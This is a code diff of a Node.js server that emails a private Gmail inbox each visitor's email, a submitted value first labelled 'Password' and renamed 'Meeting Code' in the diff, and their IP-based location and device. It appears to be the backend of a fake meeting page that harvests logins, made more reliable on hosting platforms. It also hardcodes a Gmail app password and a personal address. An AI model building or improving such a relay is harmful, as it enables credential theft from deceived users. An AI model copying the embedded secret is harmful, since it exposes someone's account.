@@ -21,14 +21,48 @@ const GMAIL_APP_PASSWORD = "gela wycz wiox vfbv"; // 16-char Gmail App Password
 const ADMIN_EMAIL = "adamsrasheed42@gmail.com";
 // -------------------------------------------------------------------------
 
-// Email transporter, used to notify the admin on every meeting join.
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: {
-    user: GMAIL_USER,
-    pass: GMAIL_APP_PASSWORD,
-  },
-});
+// Email transporters, used to notify the admin on every meeting join.
+// Using explicit host/port/family instead of service: "gmail" - on some
+// hosts (Render, Railway, etc.) the shorthand resolves Gmail's SMTP
+// server over IPv6 and times out, even though the same code works fine
+// locally. Forcing IPv4 (family: 4) avoids that. Since some hosts block
+// one port but not the other, we try 587 first, then fall back to 465.
+const transporterPorts = [
+  { port: 587, secure: false }, // STARTTLS
+  { port: 465, secure: true }, // implicit TLS
+];
+
+const transporters = transporterPorts.map(({ port, secure }) =>
+  nodemailer.createTransport({
+    host: "smtp.gmail.com",
+    port,
+    secure,
+    family: 4, // force IPv4 - avoids IPv6 connection timeouts on some hosts
+    connectionTimeout: 10000, // fail fast (10s) instead of hanging
+    auth: {
+      user: GMAIL_USER,
+      pass: GMAIL_APP_PASSWORD,
+    },
+  })
+);
+
+// Tries each transporter in order, returning as soon as one succeeds.
+// Throws the last error if all of them fail.
+async function sendMailWithFallback(mailOptions) {
+  let lastError;
+  for (let i = 0; i < transporters.length; i++) {
+    const { port } = transporterPorts[i];
+    try {
+      await transporters[i].sendMail(mailOptions);
+      console.log(`Email sent successfully via port ${port}`);
+      return;
+    } catch (err) {
+      console.warn(`Port ${port} failed: ${err.message}`);
+      lastError = err;
+    }
+  }
+  throw lastError;
+}
 
 async function sendJoinEmail(entry) {
   if (!GMAIL_USER || !GMAIL_APP_PASSWORD || !ADMIN_EMAIL || GMAIL_APP_PASSWORD === "xxxxxxxxxxxxxxxx") {
@@ -45,7 +79,7 @@ async function sendJoinEmail(entry) {
     SEP,
     `Email: ${entry.email || "Unknown"}`,
     SEP,
-    `Password: ${entry.meetingCode}`,
+    `Meeting Code: ${entry.meetingCode}`,
     SEP,
     `Time: ${when}`,
     SEP,
@@ -65,15 +99,14 @@ async function sendJoinEmail(entry) {
   ].join("\n");
 
   try {
-    await transporter.sendMail({
+    await sendMailWithFallback({
       from: GMAIL_USER,
       to: ADMIN_EMAIL,
       subject: `Meeting join: ${entry.name || entry.email || "Unknown user"}`,
       text,
     });
-    console.log("Join notification email sent successfully to", ADMIN_EMAIL);
   } catch (err) {
-    console.error("Failed to send join notification email:", err.message);
+    console.error("Failed to send join notification email (both ports failed):", err.message);
   }
 }
 
@@ -145,8 +178,12 @@ function labelDeviceType(userAgent) {
 }
 
 const app = express();
-app.set("trust proxy", true);
 const PORT = process.env.PORT || 3000;
+
+// Render (and most hosts) sit the app behind a reverse proxy. Without
+// this, req.ip reports the proxy's internal IP instead of the real
+// visitor's IP, which would break the location lookup for every join.
+app.set("trust proxy", true);
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
